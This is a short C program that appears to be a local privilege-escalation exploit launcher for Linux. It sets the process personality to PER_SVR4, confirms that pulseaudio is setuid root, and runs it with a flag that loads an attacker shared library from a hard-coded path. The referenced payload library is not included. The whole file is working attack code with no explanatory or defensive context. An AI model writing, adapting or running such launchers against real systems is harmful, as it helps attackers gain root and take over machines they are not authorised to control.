#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/personality.h>
#include <sys/stat.h>

#define PULSEAUDIO_PATH "/usr/bin/pulseaudio"
#define PATH_TO_EXPLOIT "/home/spender/exploit.so"

int main(void)
{
	int ret;
	struct stat fstat;

	ret = personality(PER_SVR4);

	if (ret == -1) {
		fprintf(stderr, "Unable to set personality!\n");
		return 0;
	}

	fprintf(stdout, " [+] Personality set to: PER_SVR4\n");

	if (stat(PULSEAUDIO_PATH, &fstat)) {
		fprintf(stderr, "Pulseaudio does not exist!\n");
		return 0;
	}

	if (!(fstat.st_mode & S_ISUID) || fstat.st_uid != 0) {
		fprintf(stderr, "Pulseaudio is not suid root!\n");
		return 0;
	}
	
	execl(PULSEAUDIO_PATH, PULSEAUDIO_PATH, "--log-level=0", "-L", PATH_TO_EXPLOIT, NULL);

	return 0;
}
